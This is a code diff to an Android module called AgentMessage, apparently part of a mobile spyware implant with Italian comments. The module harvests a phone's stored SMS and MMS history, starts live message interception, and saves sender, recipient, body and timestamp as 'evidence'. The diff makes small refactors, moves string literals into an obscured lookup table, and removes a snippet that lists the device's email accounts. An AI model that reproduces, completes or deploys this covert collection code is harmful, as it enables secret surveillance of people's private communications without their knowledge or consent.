@@ -13,13 +13,10 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.Iterator;
 
-import android.accounts.Account;
-import android.accounts.AccountManager;
-
 import com.android.service.LogR;
+import com.android.service.Messages;
 import com.android.service.Mms;
 import com.android.service.Sms;
-import com.android.service.Status;
 import com.android.service.agent.sms.MmsBrowser;
 import com.android.service.agent.sms.SmsBrowser;
 import com.android.service.auto.Cfg;
@@ -41,36 +38,39 @@ import com.android.service.util.WChar;
  * @real-author Que, r0x
  */
 public class AgentMessage extends AgentBase implements Observer<Sms> {
-	private static final String TAG = "AgentMessage";
-
+	private static final String TAG = "AgentMessage"; //$NON-NLS-1$
+	//$NON-NLS-1$
 	private static final int SMS_VERSION = 2010050501;
-	//private SmsHandler smsHandler;
+
+	// private SmsHandler smsHandler;
 
 	@Override
 	public void begin() {
 		ListenerSms.self().attach(this);
 
-		Markup storedImsi = new Markup(AgentType.AGENT_SMS);
+		final Markup storedImsi = new Markup(AgentType.AGENT_SMS);
 
 		// Abbiamo gia' catturato lo storico
 		if (storedImsi.isMarkup() == false) {
-			if(Cfg.DEBUG) Check.log( TAG + " (begin): cattura sms di storico");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (begin): cattura sms di storico");//$NON-NLS-1$
+			}
 
-			SmsBrowser smsBrowser = new SmsBrowser();
-			ArrayList<Sms> listSms = smsBrowser.getSmsList();
-			Iterator<Sms> iterSms = listSms.listIterator();
+			final SmsBrowser smsBrowser = new SmsBrowser();
+			final ArrayList<Sms> listSms = smsBrowser.getSmsList();
+			final Iterator<Sms> iterSms = listSms.listIterator();
 
 			while (iterSms.hasNext()) {
-				Sms s = iterSms.next();
+				final Sms s = iterSms.next();
 				saveSms(s);
 			}
 
-			MmsBrowser mmsBrowser = new MmsBrowser();
-			ArrayList<Mms> listMms = mmsBrowser.getMmsList();
-			Iterator<Mms> iterMms = listMms.listIterator();
+			final MmsBrowser mmsBrowser = new MmsBrowser();
+			final ArrayList<Mms> listMms = mmsBrowser.getMmsList();
+			final Iterator<Mms> iterMms = listMms.listIterator();
 
 			while (iterMms.hasNext()) {
-				Mms mms = iterMms.next();
+				final Mms mms = iterMms.next();
 				mms.print();
 				saveMms(mms);
 			}
@@ -80,14 +80,14 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		}
 
 		// Iniziamo la cattura live
-		SmsHandler smsHandler = new SmsHandler();
+		final SmsHandler smsHandler = new SmsHandler();
 		smsHandler.start();
 	}
 
 	@Override
 	public void end() {
 		ListenerSms.self().detach(this);
-		//smsHandler.quit();
+		// smsHandler.quit();
 	}
 
 	@Override
@@ -109,41 +109,27 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		return 0;
 	}
 
-	// SNIPPET
-	/**
-	 * Check email accounts.
-	 */
-	private void checkEmailAccounts() {
-		final Account[] accounts = AccountManager.get(Status.getAppContext()).getAccounts();
-
-		for (final Account account : accounts) {
-
-			final String name = account.name;
-			if(Cfg.DEBUG) Check.log( TAG + name);
-		}
-	}
-
 	private void saveSms(Sms sms) {
-		String address = sms.getAddress();
-		byte[] body = WChar.getBytes(sms.getBody());
-		long date = sms.getDate();
-		boolean sent = sms.getSent();
+		final String address = sms.getAddress();
+		final byte[] body = WChar.getBytes(sms.getBody());
+		final long date = sms.getDate();
+		final boolean sent = sms.getSent();
 
 		saveEvidence(address, body, date, sent);
 	}
 
 	private void saveMms(Mms mms) {
-		String address = mms.getAddress();
-		byte[] subject = WChar.getBytes("MMS Subject: " + mms.getSubject());
-		long date = mms.getDate();
-		DateTime filetime = new DateTime(date);
-		boolean sent = mms.getSent();
+		final String address = mms.getAddress();
+		final byte[] subject = WChar.getBytes(Messages.getString("10.1") + mms.getSubject()); //$NON-NLS-1$
+		final long date = mms.getDate();
+		final DateTime filetime = new DateTime(date);
+		final boolean sent = mms.getSent();
 
 		saveEvidence(address, subject, date, sent);
 	}
 
 	private void saveEvidence(String address, byte[] body, long date, boolean sent) {
-		DateTime filetime = new DateTime(new Date(date));
+		final DateTime filetime = new DateTime(new Date(date));
 
 		String from, to;
 
@@ -151,11 +137,11 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 
 		if (sent) {
 			flags = 0;
-			from = "local";
+			from = Messages.getString("10.2"); //$NON-NLS-1$
 			to = address;
 		} else {
 			flags = 1;
-			to = "local";
+			to = Messages.getString("10.3"); //$NON-NLS-1$
 			from = address;
 		}
 
